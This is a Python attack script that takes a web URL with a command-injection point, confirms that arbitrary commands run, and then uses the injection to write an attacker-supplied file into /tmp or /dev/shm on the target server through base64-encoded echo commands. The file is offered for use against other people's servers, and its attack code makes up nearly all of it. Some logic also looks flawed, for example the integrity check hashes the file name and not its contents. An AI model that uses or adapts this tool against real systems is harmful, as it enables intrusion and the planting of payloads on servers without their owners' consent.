#!/usr/bin/env python3
"""
RCE File upload 
"""
import requests,argparse,random,string,hashlib,base64

target = ''
upload_method = 'echo'
upload_file = ''
custom_name = ''


def generate_name(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def parse_arguments():
    global target,upload_method,upload_file,custom_name
    parser = argparse.ArgumentParser(description="Exploitation of RCE vulnerability and upload files")
    parser.add_argument('--target','-t',dest="target",help='The target vulnerable URL');    
    parser.add_argument('--upload-method','-m',dest="uploadmethod",help='');
    parser.add_argument('--list-methods',action='store_true',dest='listmethods',help='List the available upload methods');
    parser.add_argument('--file','-f',dest='ufile',help='The file to upload');
    parser.add_argument('--name',dest='customname',help='The name of the uploaded file to be');
    
    args = parser.parse_args()
    
    if args.target: target = args.target
    if args.uploadmethod: upload_method= args.uploadmethod
    if args.ufile: upload_file = args.ufile
    if args.customname: custom_name = args.customname
    if args.listmethods: list_methods()
    
def run_command(command):
    global target
    
    uri = target.replace("RCE",command)
    response = requests.get(uri)
    return response.text

def list_methods():
    m = """
    Available Uploading Methods
    ---------------------------
    
    echo \t use /bin/cat for uploading a file
    wget \t use /bin/wget to download a file to the target
    curl \t use /bin/curl to download a file to the target
    """
    print(m)
    
def cat_upload():
    global target,upload_file,custom_name
    try:
        file_name = ''
        if custom_name != '': 
            file_name = custom_name 
        else:
            file_name = generate_name(8)
        
        with open(upload_file,'rb') as ufile:
            data = ufile.read()
              
        upload_path = get_available_upload_path(file_name)
        upload_file_path = upload_path+file_name
        filehash = hashlib.md5(upload_file.encode('utf-8')).hexdigest()
        
        if upload_file_path != "":
            
            run_command("echo -n \"{data}\" | base64 -d >> {path}".format(data=str(base64.b64encode(data)),path=upload_file_path))
        
            if check_integrity(upload_file_path,filehash):
                print("[+] Checking File Integrity... OK")
                print("File uploaded to: "+upload_file_path)
            else:
                print("[+] Checking File Integrity... FAILED")
                print("Failed to upload file")                
        
        else:
            print("[!] Not available upload path.")
    except Exception as x:
        print(x)
    
def get_available_upload_path(filename):
    run_command('touch /tmp/'+filename)
    result = run_command('ls /tmp/')
    if filename in result:
        return "/tmp/"
    
    run_command('touch /dev/shm/'+filename)
    result = run_command('ls /dev/shm/')
    if filename in result:
        return "/dev/shm/"    
    
    return ""
    
    
def wget_download():
    pass
def curl_download():
    pass
    
def check_rce_is_working():
    global target
    uniqstring = generate_name(42)
    uri = target.replace("RCE","echo {UNIQ}".format(UNIQ=uniqstring))
    response = requests.get(uri)
    if uniqstring in response.text:
        return True
    else:
        return False
    
def check_integrity(remote_file,hashcode):
    response = run_command('md5sum {file}'.format(file=remote_file))
    if hashcode in response:
        return True
    else:
        return False
def main():
    global upload_method
    
    parse_arguments()
    
    print("[*] Checking RCE is working")
    if check_rce_is_working():
        print("[+] It Works perfectly")
        if upload_method == 'echo': cat_upload()
        if upload_method == 'wget': wget_download()
        if upload_method == 'curl': curl_download()
    else:
        print("[!] Cannot run arbritary code")
    
    
if __name__ == '__main__':
    main()